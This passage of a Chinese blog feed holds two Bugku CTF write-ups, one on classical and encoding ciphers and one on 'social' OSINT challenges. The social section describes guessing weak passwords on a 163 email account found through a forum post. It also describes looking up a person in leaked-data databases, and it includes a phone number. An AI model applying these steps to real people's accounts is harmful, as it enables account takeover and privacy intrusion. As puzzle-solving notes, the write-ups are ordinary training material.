class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>]</span><br><span class="line">str2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">str2 = str2+chr(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print str2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##下面步骤是是百度的</span></span><br><span class="line"><span class="keyword">from</span> HTMLParser <span class="keyword">import</span> HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>得到一个Unicode编码，放在站长工具跑一下，得到一串ASCII码，再来转义一下，发现是html编码，解码之后发现还有URL编码，放在站长工具上跑一下就行<br><img src="http://img.blog.csdn.net/20180212170000133?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>其实网上还有一中简单的方法，用一个叫converter的工具,方法自己找</p><h2 id=""><a href="#" class="headerlink" title=".!?"></a>.!?</h2><p>另类的Ook编码<br>直接去网站解码即可</p><h2 id="-1"><a href="#-1" class="headerlink" title="+[]-"></a>+[]-</h2><p>另类的brainfuck编码，直接去网站解码即可</p><h2 id="0x09-奇怪的密码"><a href="#0x09-奇怪的密码" class="headerlink" title="0x09 奇怪的密码"></a>0x09 奇怪的密码</h2><p>给的提示不知道是啥，只能一个个试一下，又毫无头绪，再看看题目，发现那一段密文特别像flag，于是对比gndk与flag的ASCII码，突然发现是依次减少的<br>于是分别用C还有python写个脚本解密，得到flag,代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[]=<span class="string">"gndk€rlqhmtkwwp&#125;z"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(a);i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=a[i]-(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line"><span class="comment">##print str1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line"> flag = flag+chr((ord(i)-count))</span><br><span class="line"> count=count+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h2><p>这是个杰斐逊密码盘，根据第一个密钥跟密文，把第二行单独取出来，然后从的地方开始，放到内容最前面<br>例如<code>：&lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;   --&gt;   &lt;HGVSFUWIKPBELNACZDTRXMJQOY &lt;</code><br>最后得到下面的密文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HGVSFUWIKPBELNACZDTRXMJQOY </span><br><span class="line">CPMNZQWXYIHFRLABEUOTSGJVDK </span><br><span class="line">BVIQHKYPNTCRMOSFEZWAXJGDLU </span><br><span class="line">TEQGYXPLOCKBDMAIZVRNSJUWFH </span><br><span class="line">SLOQXVETAMKGHIWPNYCJBFZDRU </span><br><span class="line">XQYIZMJWAORPLNDVHGFCUKTEBS </span><br><span class="line">WATDSRFHENYVUBMCOIKZGJXPLQ </span><br><span class="line">CEONJQGWTHSPYBXIZULVKMRAFD </span><br><span class="line">RJLXKISEFAPMYGHBQNOZUTWDCV </span><br><span class="line">QWXPHKZGJTDSENYVUBMLAOIRFC </span><br><span class="line">GOIKFHENYVUWABMCXPLTDSRJQZ </span><br><span class="line">LTDENQWAOXPYVUIKZGJBMCSRFH </span><br><span class="line">ENYSRUBMCQWVJXPLTDAOIKFZGH </span><br><span class="line">SWAYXPLVUBOIKZGJRFHENMCQTD</span><br></pre></td></tr></table></figure></p><p>然后一列列去尝试，倒数第六列是flag<br>最后提交的flag是小写</p><h2 id="0x11-伪加密"><a href="#0x11-伪加密" class="headerlink" title="0x11 伪加密"></a>0x11 伪加密</h2><p>上次的博客内容就介绍过，不多说，把09改为00即可</p><h2 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h2><p>发现没有超过F的字母，边猜测是16进制，然后16进制转码，发现一串全都是数字跟字母的字符串，应该是Base64<br><img src="http://img.blog.csdn.net/20180212171035847?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>解码后发现几组英文。。。。<br><img src="http://img.blog.csdn.net/20180212171116843?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发现跟上次校赛的键盘题格式差不多，猜测应是键盘密码，这题格式试了好久，都快想说MMP了，google之后才知道这题格式是flag:xxxxxxx(全是大写)<br>坑惨了!!</p><h2 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h2><p>百度银河字母，对照着下图就能找到flag<br><img src="http://img.blog.csdn.net/20180212170936155?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="银河字母"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;滴答-滴&quot;&gt;&lt;a href=&quot;#滴答-滴&quot; class=&quot;headerlink&quot; title=&quot;滴答~滴&quot;&gt;&lt;/a&gt;滴答~滴&lt;/h2&gt;&lt;p&gt;遂一看就知道是摩斯密码，直接摩斯解密，获得密码&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>bugku Social write up</title>
    <link href="0verwatch.top/2018/02/08/bugku-social-wp/"/>
    <id>0verwatch.top/2018/02/08/bugku-social-wp/</id>
    <published>2018-02-08T06:16:20.000Z</published>
    <updated>2018-05-20T09:19:29.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="密码？？？"><a href="#密码？？？" class="headerlink" title="密码？？？"></a>密码？？？</h2><p>根据提示直接猜测密码为zs19970315，尝试成功<br><img src="https://img.blog.csdn.net/2018020814024487?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="密码"><br><a id="more"></a></p><h2 id="域名解析？"><a href="#域名解析？" class="headerlink" title="域名解析？"></a>域名解析？</h2><p>直接改本地的host文件，win10的话在’C:\Windows\System32\drivers\etc’目录下，记得用管理权限打开<br>里面添加一行120.24.86.145  flag.bugku.com<br>然后浏览器打开flag.bugku.com获得key<br><img src="https://img.blog.csdn.net/20180208140334597?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="域名解析"></p><h2 id="信息查找？？？"><a href="#信息查找？？？" class="headerlink" title="信息查找？？？"></a>信息查找？？？</h2><p>百度找到网页：<code>http://www.xiukee.com/show_356966.html</code><br>有个提示是flag是群号码，那我就试一下群号码试就行了，成功过关</p><h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>把压缩包下载下来之后发现是伪加密，拖进HXD中查找16进制，<br><img src="https://img.blog.csdn.net/20180208141001433?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="伪加密"><br>把图中红色的09改为00，因为基数是伪加密。<br>可参考：<a href="http://0verwatch.top/2018/02/08/zipfalse/">http://0verwatch.top/2018/02/08/zipfalse/</a><br>打开压缩包发现一个txt文件，叫我寻找下图的信息，<br><img src="https://img.blog.csdn.net/20180208141046125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="信息"><br>翻墙找个社工库查一查，但很多社工库都挂掉了，我直接看的别人的wp得到的结果。。。<br>手机号码是15206164164</p><h2 id="入门题目，社工帝？"><a href="#入门题目，社工帝？" class="headerlink" title="入门题目，社工帝？"></a>入门题目，社工帝？</h2><p>给了个名字给我，上谷歌一句搜索命令：intitle:孤长离，第一个就是它的贴吧<br><img src="https://img.blog.csdn.net/20180208141131218?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="贴吧"><br>里面有个163的邮箱，又根据提示是弱口令，百度弱口令，一个个试，因为163邮箱有验证码就不能用bp去爆破，还是手动试吧，我试到第二个就是了。<br>在里面找到flag<br><img src="https://img.blog.csdn.net/20180208141203841?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="flag"></p><h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>拿到一个图片邮件啥东西都没有，只能去binwalk一下了，发现里面有个压缩包，打开一看啥都没有<br>又看了看题目，说是头像，这时候意识到自己想错方向了，不应该往misc方向想的<br>于是乎就用百度识图看一看。。又是什么都没有。。。。<br><img src="https://img.blog.csdn.net/20180208141336902?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>再来谷歌识图，这次找到一个github上的bugku，翻来翻去还是没找到flag<br>最后发现一个微博链接，<br><img src="https://img.blog.csdn.net/20180208141440383?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>点进去发现一个醒目的图片<br><img src="https://img.blog.csdn.net/20180208141456490?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>再打开一看，bingo找到flag<br><img src="https://img.blog.csdn.net/20180208141518224?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;密码？？？&quot;&gt;&lt;a href=&quot;#密码？？？&quot; class=&quot;headerlink&quot; title=&quot;密码？？？&quot;&gt;&lt;/a&gt;密码？？？&lt;/h2&gt;&lt;p&gt;根据提示直接猜测密码为zs19970315，尝试成功&lt;br&gt;&lt;img src=&quot;https://img.blog.csdn.net/2018020814024487?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;密码&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Social" scheme="0verwatch.top/tags/Social/"/>
    
  </entry>
  
</feed>
